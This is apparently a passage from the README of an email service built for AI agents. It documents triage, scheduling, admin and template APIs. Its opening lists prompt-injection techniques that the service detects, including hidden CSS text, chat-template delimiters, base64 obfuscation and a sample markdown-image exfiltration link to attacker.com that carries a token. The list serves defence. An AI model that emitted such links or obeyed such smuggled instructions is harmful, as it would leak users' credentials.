- **CSS / Font Smuggling**: `display:none`, `font-size:0px`, `visibility:hidden`, zero-width Unicode tags.
- **ChatML & Prompt Delimiters**: `<|im_start|>`, `[INST]`, `### System:`, `<|endoftext|>`.
- **Exfiltration Attacks**: Markdown image credential leaks (`![img](https://attacker.com/log?token=...)`).
- **Base64 Payload Obfuscation**: Automatic decoding and heuristic recursion.

---

## 🧭 Triage, scheduling and conversations

- **Labels** – `PATCH /v1/agents/{email}/messages/{id}` with `{"labels": ["needs-human"]}`; filter with `?label=`.
- **Trash / restore** – `DELETE` moves a message to trash (cancelling an unsubmitted scheduled send); `POST .../restore` brings it back; `?trashed=true` lists trash.
- **Scheduled send** – add `send_at` (ISO-8601, up to 90 days ahead) to send/reply, REST or MCP. Status is `scheduled` until submitted.
- **Conversations** – `GET /v1/agents/{email}/conversations[/{id}]` groups messages by thread with unread counts, participants and labels.
- **Lifecycle** – `GET .../messages/{id}/lifecycle` returns the review, queue, retry and provider-delivery timeline.
- **Metrics & protection** – `GET /v1/agents/{email}/metrics`; `GET/PUT /v1/agents/{email}/protection` (changing it is admin-only so an agent key cannot weaken its own approval gate).
- **Events** – `GET /v1/events`, `GET /v1/events/{id}`, `POST /v1/events/{id}/redeliver` (admin) expose the webhook event log.
- **Discovery** – `GET /v1/info` (public) and `GET /v1/whoami`.
- **MCP** – the same capabilities are available as MCP tools (`list_conversations`, `update_message_labels`, `delete_message`, `get_message_lifecycle`, `whoami`, …); `GET /mcp/tools` lists them all.

Operations (migrations, backup/restore, key rotation): see [docs/operations.md](docs/operations.md).

## 🗂️ Account administration, starter templates and inbox lifecycle

- **Soft delete** – `DELETE /v1/agents/{email}` hides the inbox and stops it receiving mail (the SMTP receiver rejects its address) but keeps all data. `POST /v1/agents/{email}/restore` brings it back; `GET /v1/agents?include_deleted=true` lists hidden inboxes; `DELETE ...?purge=true` permanently deletes it. API keys of a soft-deleted inbox are rejected until it is restored.
- **Account suppressions** (admin) – `GET /v1/account/suppressions[?address=]` aggregates every inbox's blocked recipients; `DELETE /v1/account/suppressions/{address}` removes that address from all inboxes.
- **Cross-inbox contacts** (admin) – `GET/POST /v1/contacts`, `GET/PATCH/DELETE /v1/contacts/{address}`. These are views over the existing per-inbox contact rows, not a separate table. An address can exist in several inboxes: reads return every match, and `PATCH`/`DELETE` need `?agent_email=` when the address is ambiguous.
- **Export** (admin) – `GET /v1/account/export?limit_per_collection=` returns agents, contacts, templates, suppressions and webhook endpoints. It never includes message bodies, attachments, API keys or hashes, SMTP credentials or webhook secrets, and it reports `truncated` / `truncated_collections` when a collection hit the cap.
- **Template validation** – `POST /v1/templates/validate` checks placeholder syntax and renders with sample data without saving anything.
- **Starter templates** – `GET /v1/starter-templates` and `/{alias}` provide eight ready-made templates (verification code, password reset, welcome, receipt, support acknowledgement, meeting follow-up, outreach introduction, weekly digest). `POST /v1/agents/{email}/templates/from-starter/{alias}` copies one into an inbox as an independent, editable template. The outreach template is for recipients who have agreed to hear from you.

## 🧪 Tests

```bash
cd server
pip install -r requirements-dev.txt
python -m pytest -q
```

The suite covers REST/MCP authentication and scope policy (anonymous, malformed, expired, revoked, read-only, reviewer, cross-mailbox), send idempotency and suppression, contact consent history, and SES/SNS feedback ordering. CI runs it on every push along with a client type-check.

## 📄 License

Apache 2.0. Open-source for developers and autonomous AI agent systems.
